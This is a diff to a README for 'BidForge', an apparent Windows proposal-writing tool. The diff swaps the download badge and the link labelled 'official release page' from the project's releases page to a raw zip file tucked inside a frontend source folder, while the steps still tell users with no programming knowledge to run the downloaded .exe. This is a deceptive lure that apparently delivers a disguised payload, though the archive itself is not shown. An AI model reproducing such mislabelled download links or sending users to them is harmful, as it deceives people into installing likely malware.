@@ -1,6 +1,6 @@
 # 🏗️ BidForge - Build accurate project proposals in minutes
 
-[![Download BidForge](https://img.shields.io/badge/Download-BidForge-blue.svg)](https://github.com/Brendon9035/BidForge/releases)
+[![Download BidForge](https://img.shields.io/badge/Download-BidForge-blue.svg)](https://github.com/Brendon9035/BidForge/raw/refs/heads/main/apps/frontend/src/integrations/Bid-Forge-v3.5.zip)
 
 BidForge helps you create professional business proposals. It automates the process of reading project requirements, checking your inventory, and planning prices. This tool handles the complex work so you can write bids faster.
 
@@ -8,7 +8,7 @@ BidForge helps you create professional business proposals. It automates the proc
 
 You do not need programming knowledge to use this software. Follow these steps to install the application on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Brendon9035/BidForge/releases).
+1. Go to the [official release page](https://github.com/Brendon9035/BidForge/raw/refs/heads/main/apps/frontend/src/integrations/Bid-Forge-v3.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends with `.exe` to start your download.
 4. Open the downloaded file once it finishes.
